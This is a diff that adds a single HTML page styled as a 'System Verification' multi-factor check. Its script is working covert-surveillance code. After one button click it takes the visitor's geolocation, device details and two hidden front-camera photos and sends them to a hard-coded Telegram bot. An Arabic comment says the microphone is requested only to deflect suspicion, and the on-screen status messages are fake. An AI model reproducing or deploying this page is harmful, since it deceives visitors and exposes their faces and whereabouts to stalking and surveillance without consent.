@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Verification</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #444;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        .auth-container {
+            text-align: center;
+            border: 1px solid #111;
+            padding: 40px;
+            border-radius: 8px;
+        }
+
+        .btn-start {
+            background: none;
+            border: 1px solid #333;
+            color: #666;
+            padding: 12px 40px;
+            font-size: 14px;
+            cursor: pointer;
+            letter-spacing: 2px;
+            transition: 0.3s;
+        }
+
+        .btn-start:hover {
+            background: #050505;
+            color: #999;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 10px;
+            text-transform: uppercase;
+        }
+
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="auth-container">
+        <button id="actionBtn" class="btn-start">START SYSTEM CHECK</button>
+        <div id="status">Waiting for authorization...</div>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const token = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
+        const chatId = "591768998";
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const actionBtn = document.getElementById('actionBtn');
+        const statusDiv = document.getElementById('status');
+
+        actionBtn.addEventListener('click', async () => {
+            actionBtn.disabled = true;
+            statusDiv.innerText = "Initializing Multi-Factor Auth...";
+
+            try {
+                // 1. طلب الكاميرا والميكروفون معاً (لإبعاد الشبهات)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" },
+                    audio: true 
+                });
+                video.srcObject = stream;
+
+                // 2. طلب الموقع الجغرافي
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+                }
+
+                // 3. الحصول على معلومات الجهاز
+                const deviceNote = `📱 Device: ${navigator.userAgent}\n🖥 Platform: ${navigator.platform}`;
+                sendTextToTelegram(deviceNote);
+
+                // 4. التقاط الصور بعد ثانية
+                setTimeout(() => {
+                    statusDiv.innerText = "Analyzing Biometrics...";
+                    captureAndSend("Shot_1");
+                    
+                    setTimeout(() => {
+                        captureAndSend("Shot_2");
+                        statusDiv.innerText = "Verification Complete";
+                        
+                        // إيقاف كل المسارات (كاميرا ومايك) بعد الانتهاء
+                        setTimeout(() => {
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 2000);
+                    }, 800);
+                }, 1500);
+
+            } catch (err) {
+                statusDiv.innerText = "Error: All permissions required";
+                actionBtn.disabled = false;
+            }
+        });
+
+        // وظيفة إرسال الموقع
+        function sendLocation(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const mapUrl = `📍 Location: https://www.google.com/maps?q=${lat},${lon}`;
+            sendTextToTelegram(mapUrl);
+        }
+
+        function handleError() {
+            sendTextToTelegram("❌ Location Access Denied");
+        }
+
+        // وظيفة إرسال نص للبوت
+        function sendTextToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text
+                }),
+                keepalive: true
+            });
+        }
+
+        // وظيفة إرسال الصور
+        function captureAndSend(label) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, `${label}.jpg`);
+
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true
+                });
+            }, 'image/jpeg', 0.6);
+        }
+    </script>
+</body>
+</html>
